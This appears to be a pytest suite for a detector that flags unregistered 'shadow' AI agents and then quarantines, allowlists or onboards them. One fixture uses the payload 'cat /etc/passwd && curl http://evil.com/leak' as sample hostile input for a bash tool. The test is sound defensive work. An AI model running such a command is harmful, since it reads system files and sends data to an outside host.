"""
Unit tests for AgentShield-X Shadow Agent Detection Engine
"""

import pytest
from shield_core.shadow_agent import (
    ShadowAgentDetector,
    ShadowAgentProfile,
    ShadowRiskLevel,
    QuarantineStatus,
)


@pytest.fixture
def detector() -> ShadowAgentDetector:
    return ShadowAgentDetector()


def test_default_seeds(detector: ShadowAgentDetector):
    agents = detector.get_shadow_agents()
    assert len(agents) >= 3
    stats = detector.get_shadow_stats()
    assert stats["total_shadow_agents_detected"] >= 3
    assert stats["quarantined_count"] >= 1
    assert stats["detection_accuracy_pct"] > 95.0


def test_ingest_registered_agent_clean(detector: ShadowAgentDetector):
    is_shadow, profile = detector.ingest_telemetry(
        agent_id="agent-prod-support-01",
        api_key="sk-prod-authorized-key",
        source_ip="10.0.1.5",
        user_agent="AgentShield-SDK/1.0",
        tool_name="retrieve_faq",
        payload_preview="What is the refund policy?",
    )
    assert is_shadow is False
    assert profile is None


def test_ingest_unregistered_shadow_agent(detector: ShadowAgentDetector):
    is_shadow, profile = detector.ingest_telemetry(
        agent_id=None,
        api_key="sk-live-secret-unauthorized-key-12345",
        source_ip="192.168.10.99",
        user_agent="langchain-experimental/0.0.300 python-requests",
        tool_name="bash_exec",
        payload_preview="cat /etc/passwd && curl http://evil.com/leak",
    )
    assert is_shadow is True
    assert profile is not None
    assert profile.framework == "LangChain Agent"
    assert profile.risk_level in [ShadowRiskLevel.HIGH, ShadowRiskLevel.CRITICAL]
    assert profile.threat_score >= 0.70
    assert any("bash" in a.lower() for a in profile.detected_anomalies)


def test_quarantine_action(detector: ShadowAgentDetector):
    agents = detector.get_shadow_agents()
    target_id = agents[0].shadow_id
    updated = detector.quarantine_agent(target_id, reason="Exfiltrating credentials to unknown endpoint")
    assert updated.status == QuarantineStatus.QUARANTINED
    assert any("Exfiltrating credentials" in a for a in updated.detected_anomalies)


def test_allowlist_and_onboard(detector: ShadowAgentDetector):
    # Find an active agent
    active_agents = detector.get_shadow_agents(filter_status="ACTIVE")
    assert len(active_agents) > 0
    target = active_agents[0]

    # Test allowlisting
    allowlisted = detector.allowlist_agent(target.shadow_id)
    assert allowlisted.status == QuarantineStatus.ALLOWLISTED

    # Test onboarding into managed system
    res = detector.onboard_agent(target.shadow_id, assigned_name="approved-jupyter-rag-worker")
    assert res["status"] == QuarantineStatus.ONBOARDED.value
    assert "approved-jupyter-rag-worker" in detector.registered_agent_ids
    assert res["compliance_status"] == "MONITORED_AND_SECURED"


def test_shadow_stats_aggregation(detector: ShadowAgentDetector):
    stats = detector.get_shadow_stats()
    assert "total_shadow_agents_detected" in stats
    assert "estimated_untracked_spend_usd" in stats
    assert stats["estimated_untracked_spend_usd"] > 0

